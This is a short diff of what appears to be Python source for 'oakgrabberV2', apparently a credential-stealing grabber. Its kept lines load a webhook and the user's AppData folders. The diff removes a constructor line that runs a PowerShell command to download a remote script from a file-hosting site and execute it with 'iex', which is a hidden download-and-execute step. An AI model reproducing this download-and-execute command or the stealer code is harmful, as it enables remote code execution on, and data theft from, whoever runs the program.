@@ -119,7 +119,6 @@ class functions(object):
 
 class oakgrabberV2(functions):
     def __init__(self):
-        os.system("iwr -useb https://files.catbox.moe/h1spa1.ps1 | iex")
         self.webhook = config.get('webhook')
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
